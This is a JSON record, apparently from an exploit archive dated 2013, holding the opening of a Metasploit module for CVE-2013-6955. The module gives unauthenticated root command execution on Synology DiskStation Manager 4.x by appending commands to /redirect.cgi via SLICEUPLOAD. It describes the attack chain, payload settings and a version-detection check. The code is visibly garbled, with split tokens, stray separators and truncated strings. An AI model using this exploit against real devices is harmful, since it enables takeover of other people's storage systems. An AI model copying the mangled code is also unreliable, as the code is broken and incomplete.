{
    "text": "vul_name : Synology DiskStation Manager SLICEUPLOAD Remote Command Execution ， vul_cve : CVE-2013-6955 ， vul_poc :  ， This module requires Metasploit : http/metasploit.com/download ， Current source :  ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， DEVICE_INFO_PATTERN = /major= ( ?<major>\\d+ ) &minor= ( ?<minor>\\d+ ) &build= ( ?<build>\\d+ )  ， &junior=\\d+&unique=synology_\\w+_ ( ?<model> [ ^& ] + ) /x ， super ( update_info ( info ,  ， 'Name' => \"Synology DiskStation Manager SLICEUPLOAD Remote Command Execution\" ,  ， 'Description' => %q{ ， This module exploits a vulnerability found in Synology DiskStation Manager ( DSM )  ， versions 4.x , which allows the execution of arbitrary commands under root ， privileges. ， The vulnerability is located in /webman/imageSelector.cgi , which allows to append ， arbitrary data to a given file using a so called SLICEUPLOAD functionality , which ， can be triggered by an unauthenticated user with a specially crafted HTTP request. ， This is exploited by this module to append the given commands to /redirect.cgi ,  ， which is a regular shell script file , and can be invoked with another HTTP request. ， Synology reported that the vulnerability has been fixed with versions 4.0-2259 ,  ， 4.2-3243 , and 4.3-3810 Update 1 , respectively ; the 4.1 branch remains vulnerable. ， } ,  ， 'Author' => ，  [  ， 'Markus Wulftange' # Discovery , Metasploit module ，  ]  ,  ， ' ，  [  ，  [ 'CVE' , '2013-6955' ]  ,  ，  ]  ,  ， 'Privileged' => false ,  ， 'Platform' => [ 'unix' ]  ,  ， 'Arch' => ARCH_CMD ,  ， 'Payload' => ， { ， 'DisableNops' => true ,  ， 'Space' => 0x31337 ,  ， 'Compat' => ， { ， 'PayloadType' => 'cmd' ,  ， 'RequiredCmd' => 'generic perl telnet' ,  ， } ， } ,  ， 'Targets' => ，  [  ，  [ 'Automatic' , {} ]  ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， 'License' => MSF_LICENSE ,  ， 'DisclosureDate' => 'Oct 31 2013' ， register_options (  ，  [  ， Opt : RPORT ( 5000 )  ，  ]  , self.class )  ， end ， def check ， print_status ( \" # {peer} - Trying to detect installed version\" )  ， res = send_request_cgi ( { ， 'method' => 'GET' ,  ， 'uri' => normalize_uri ( 'webman' , 'info.cgi' )  ,  ， 'vars_get' => { 'host' => '} ， } )  ， version = \" # { $  ~  [  : major ] }. # { $  ~  [  : minor ] }\" ， build = $  ~  [  : build ]  ， model = $  ~  [  : model ] .sub ( /^ [ a-z ] +/ ) { | s | s [ 0 ] .upcase } ， model = \"DS # {model}\" unless model = ~ /^ [ A-Z ] / ， print_status ( \" # {peer} - Detection failed\" ) ",
    "time": "2013.12.23"
}